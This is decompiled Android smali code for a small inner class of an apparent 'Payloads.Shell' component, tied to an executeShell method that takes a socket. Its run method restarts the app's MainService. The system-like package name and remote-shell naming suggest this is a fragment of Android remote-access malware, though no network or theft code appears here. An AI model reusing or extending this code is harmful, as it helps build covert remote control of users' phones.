.class Lcom/android/ld/Payloads/Shell$1;
.super Ljava/lang/Object;
.source "Shell.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/Shell;->executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/Shell;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/Shell;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/Shell;

    .line 120
    iput-object p1, p0, Lcom/android/ld/Payloads/Shell$1;->this$0:Lcom/android/ld/Payloads/Shell;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 123
    iget-object v0, p0, Lcom/android/ld/Payloads/Shell$1;->this$0:Lcom/android/ld/Payloads/Shell;

    iget-object v0, v0, Lcom/android/ld/Payloads/Shell;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/android/ld/Payloads/Shell$1;->this$0:Lcom/android/ld/Payloads/Shell;

    iget-object v2, v2, Lcom/android/ld/Payloads/Shell;->context:Landroid/content/Context;

    const-class v3, Lcom/android/ld/MainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 124
    return-void
.end method
